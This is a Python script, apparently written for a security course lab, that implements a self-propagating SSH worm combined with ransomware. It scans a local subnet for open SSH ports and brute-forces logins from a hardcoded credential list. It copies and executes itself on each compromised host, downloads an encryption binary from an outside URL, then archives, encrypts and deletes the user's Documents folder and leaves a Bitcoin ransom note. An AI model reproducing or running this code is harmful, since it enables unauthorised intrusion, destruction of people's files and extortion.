import urllib 
import tarfile
import shutil
from subprocess import call

import paramiko
import sys
import socket, fcntl, struct
import nmap
import netinfo
import os, os.path
import netifaces

# The list of credentials to attempt
credList = [
    ('hello', 'world'),
    ('hello1', 'world'),
    ('root', '#Gig#'),
    ('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"


# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
def isInfectedSystem():
    return os.path.isfile("/tmp/infected.txt")


# Marks the system as infected
def markInfected():
    fileObj = open("/tmp/infected.txt", 'w')
    fileObj.write("Infected")
    fileObj.close()


# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
def spreadAndExecute(sftpClient):
    # This function takes as a parameter
    # an instance of the SSH class which
    # was properly initialized and connected
    # to the victim system. The worm will
    # copy itself to remote system, change
    # its permissions to executable, and
    # execute itself. Please check out the
    # code we used for an in-class exercise.
    # The code which goes into this function
    # is very similar to that code.
    
    sftpClient.put("ransomware_worm.py", "/home/cpsc/Desktop/" + "ransomware_worm.py")
    ssh.exec_command("chmod a+x /home/cpsc/Desktop/ransomware_worm.py")
    stdin, stdout, stderr = ssh.exec_command('python /home/cpsc/Desktop/ransomware_worm.py')


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
    try:
        sshClient.connect(host, username= userName, password= password)
        return 0
    except paramiko.SSHException:
        return 1
    except socket.error:
        return 3


###############################################################
# Wages a dictionary attack against the host
###############################################################
def attackSystem(host):
    # The credential list
    global credList

    # Create an instance of the SSH client
    ssh = paramiko.SSHClient()

    # Set some parameters to make things easier.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # The results of an attempt
    attemptResults = None

    # Go through the credentials
    for (username, password) in credList:
        attemptResults = tryCredentials(host, username, password, ssh)
        if attemptResults == 0:
                print "attackSystem - success"
                return ssh, username, password

    # Could not find working credentials
    return None


# Returns the IP of the current system
def getMyIP():
    networkInterfaces = netifaces.interfaces()

    # The IP address
    ip_addr = None

    # Go through all the interfaces
    for netFace in networkInterfaces:

        # The IP address of the interface
        addr = netifaces.ifaddresses(netFace)[2][0]['addr']

        # Get the IP address
        if not addr == "127.0.0.1":
            # Save the IP addrss and break
            ip_addr = addr
            break

    return ip_addr


# Returns the list of systems on the same network
def getHostsOnTheSameNetwork():
    # Create an instance of the port scanner class
    portScanner = nmap.PortScanner()

    # Scan the network for systems whose
    # port 22 is open (that is, there is possibly
    # SSH running there).
    portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

    # Scan the network for hoss
    hostInfo = portScanner.all_hosts()

    # The list of hosts that are up.
    liveHosts = []

    # Go trough all the hosts returned by nmap
    # and remove all who are not up and running
    for host in hostInfo:

        # Is ths host up?
        if portScanner[host].state() == "up":
            liveHosts.append(host)

    return liveHosts


# Main
if len(sys.argv) < 2:
    # TODO: If we are running on the victim, check if
    # the victim was already infected. If so, terminate.
    # Otherwise, proceed with malice.
    if isInfectedSystem():
        print("infected!.... quitting")
        quit()
    markInfected()

ip_addr = getMyIP()

# from the list of discovered systems
networkHosts = getHostsOnTheSameNetwork()
if ip_addr != "192.168.1.12":
    networkHosts.remove("192.168.1.12")     # Remove Original host from targets
networkHosts.remove(ip_addr)    # Remove host IP address from targets
networkHosts.remove("192.168.1.1")
print "Found hosts: ", networkHosts

# Go through the network hosts
for host in networkHosts:

    # Try to attack this host
    print "attempting connection"
    ssh, user_name, password = attackSystem(host)
    print "Victim: ", host, " ", user_name, " ", password

    if ssh:
        print "Trying to spread."

        remotepath = '/tmp/infected.txt'
        localpath = '/home/cpsc/'

        sftpClient = ssh.open_sftp()
        try:
            sftpClient.get(remotepath, localpath)
        except IOError:
            spreadAndExecute(sftpClient)
            print("Spreading Complete")

# **********************************************************************************
# **********************************THE RANSOMWARE**********************************
# **********************************************************************************
def ransomNote():
    fileObj = open("/root/Desktop/infected.txt", 'w')
    fileObj.write("Your files have been encrypted. If you want to see them again, pay up. In Bitcoin!")
    fileObj.close()

# downloading the encryption program
# Not sure if this works or not...
urllib.urlretrieve("http://ecs.fullerton.edu/_mgofman/openssl ", "encryptor") 

# creating a .tar of the specified directory
tar = tarfile.open("exdir.tar", "w:gz")        # Open the specified archive file (e.g. exdir.tar). If the archive does not already exit, create it.
tar.add("/home/cpsc/Documents")                # Add the /home/cpsc/Documents directory to the archive
tar.close()                                    # closing the .tar file

# encrypting the .tar archive using the openSSL program...
# Not sure if this works or not...
call(["encryptor"])

# Delete the /home/cpsc/Documents
shutil.rmtree('/home/cpsc/Documents')

# Leaving a ransom note...
ransomNote()
